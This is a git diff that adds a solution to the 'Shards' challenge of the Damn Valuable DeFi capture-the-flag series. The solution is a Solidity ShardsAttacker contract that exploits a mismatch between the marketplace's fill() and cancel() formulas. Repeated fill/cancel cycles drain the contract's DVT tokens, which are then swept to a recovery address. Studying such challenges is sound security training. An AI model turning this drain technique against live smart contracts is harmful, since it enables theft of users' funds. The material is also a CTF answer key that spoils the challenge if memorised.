@@ -11,6 +11,7 @@ import {
     DamnValuableNFT
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
+import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";
 
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -114,7 +115,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsAttacker(marketplace, token, recovery);
     }
 
     /**
@@ -134,5 +135,76 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+// Exploits a formula mismatch between fill() and cancel():
+//   fill()   charges: want * (price * rate / 1e6) / totalShards   (proportional, correct)
+//   cancel() refunds: want * rate / 1e6                            (ignores totalShards -- wrong)
+// Repeatedly filling then immediately cancelling the same purchase extracts
+// far more DVT than was ever paid in, and restores offer.stock each time so
+// the offer never closes and the cycle can repeat.
+contract ShardsAttacker {
+    using FixedPointMathLib for uint256;
+
+    ShardsNFTMarketplace public immutable marketplace;
+    DamnValuableToken public immutable token;
+    uint64 public immutable offerId;
+    uint256 public immutable rate;
+    uint256 public immutable totalShards;
+    uint256 public immutable totalDVT;
+    uint256 public immutable zeroCostWant;
+
+    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address recovery) {
+        marketplace = _marketplace;
+        token = _token;
+        offerId = _marketplace.nftToOffers(0);
+        token.approve(address(_marketplace), type(uint256).max);
+
+        rate = _marketplace.rate();
+        (, uint256 _totalShards,, uint256 price,,) = _marketplace.offers(offerId);
+        totalShards = _totalShards;
+        totalDVT = price.mulDivDown(rate, 1e6);
+        zeroCostWant = (_totalShards - 1) / totalDVT;
+
+        _run();
+
+        uint256 finalBal = token.balanceOf(address(this));
+        console.log("final helper balance before sweep:", finalBal);
+        if (finalBal > 0) {
+            token.transfer(recovery, finalBal);
+        }
+    }
+
+    function _run() private {
+        uint256 zeroCostRefund = zeroCostWant.mulDivUp(rate, 1e6);
+        uint256 minUsefulBal = zeroCostRefund * 2;
+        console.log("zeroCostWant:", zeroCostWant);
+        console.log("zeroCostRefund:", zeroCostRefund);
+
+        for (uint256 i = 0; i < 20; i++) {
+            if (token.balanceOf(address(marketplace)) < minUsefulBal) {
+                console.log("stopping at iteration", i);
+                break;
+            }
+            uint256 want = _nextWant();
+            if (want == 0) break;
+
+            uint256 purchaseIndex = marketplace.fill(offerId, want);
+            marketplace.cancel(offerId, purchaseIndex);
+            console.log("iteration done, helper balance:", token.balanceOf(address(this)));
+        }
+    }
+
+    function _nextWant() private view returns (uint256 want) {
+        uint256 myBal = token.balanceOf(address(this));
+        if (myBal == 0) return zeroCostWant;
+
+        uint256 mktBal = token.balanceOf(address(marketplace));
+        uint256 wantByRefund = (mktBal.mulDivDown(1e6, rate) * 95) / 100;
+        uint256 wantByCost = (myBal.mulDivDown(totalShards, totalDVT) * 95) / 100;
+        want = wantByRefund < wantByCost ? wantByRefund : wantByCost;
+        if (want < zeroCostWant) want = zeroCostWant;
+        if (want > totalShards) want = totalShards;
     }
 }
